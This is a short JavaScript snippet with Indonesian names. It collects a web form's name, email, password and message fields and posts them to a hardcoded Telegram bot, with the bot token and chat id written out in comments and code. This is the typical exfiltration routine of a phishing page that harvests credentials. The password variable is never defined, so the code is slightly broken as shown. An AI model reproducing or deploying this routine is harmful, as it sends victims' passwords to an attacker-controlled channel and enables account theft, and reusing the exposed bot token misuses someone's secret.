    // https://api.telegram.org/bot6475488330:AAF9ajJ19bFFSY12K5oAAXOexVK9oA5_2rM/sendMessage?chat_id=-1001980001261&text=halo%0AJuga&parse_mode=html

    // Nama%3A%0ASsss%0AEmail%3A%0ASsss%0APaswd%3A%0ASsss%0APesan%3A%0ASsss

function kirimPesan() {

    var nama = document.getElementById('nama');
    var email = document.getElementById('email');
    var pesan = document.getElementById('pesan');

    var gabungan = 'Nama%3A%0A' + nama.value + '%0AEmail%3A%0A' + email.value + 'Paswd%3A%0A' + Paswd.value + '%0APesan%3A%0A' + pesan.value;

    var token = '6475488330:AAF9ajJ19bFFSY12K5oAAXOexVK9oA5_2rM';
    var grup = '-1001980001261';

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
    
    
}
      
      



